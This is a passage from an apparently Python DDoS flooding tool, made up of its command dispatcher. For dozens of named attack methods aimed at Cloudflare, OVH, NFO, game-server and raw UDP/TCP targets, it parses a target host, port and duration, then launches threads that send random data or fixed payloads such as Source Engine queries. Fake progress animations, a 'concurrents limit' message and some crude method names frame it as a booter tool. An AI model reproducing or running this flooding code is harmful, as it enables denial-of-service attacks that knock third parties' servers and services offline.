					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "http-stm":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "http-cld":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ddos-guard":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "cloudflare":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 65500
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "icmprape":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1024
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udprapev3":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 10000
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfodrop":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhnat":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhamp":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfocrush":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "greeth":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "telnet":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhkill":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhdown":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ssdp":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hydrakiller":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfonull":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killall":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhslav":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "cpukill":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcprape":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nforape":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpraw":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\0\x14\0\x01\x03"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpraw":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hexraw":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stdraw":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vseraw":
			try:
				if running >= 1000:
					print("\033[97mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					os.system('cls')
					print("\033[97m[-] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[\] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[|] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack....")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[+] Sending Attack...")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[-] Sending Attack..")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[/] Sending Attack.")
					time.sleep(1)
					os.system('cls')
					print("\033[97m[INFO] Floading Sent Successfully")
					time.sleep(3)
					os.system('cls')
					print(attacked)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "synraw":
			try:
				if running >= 1000:
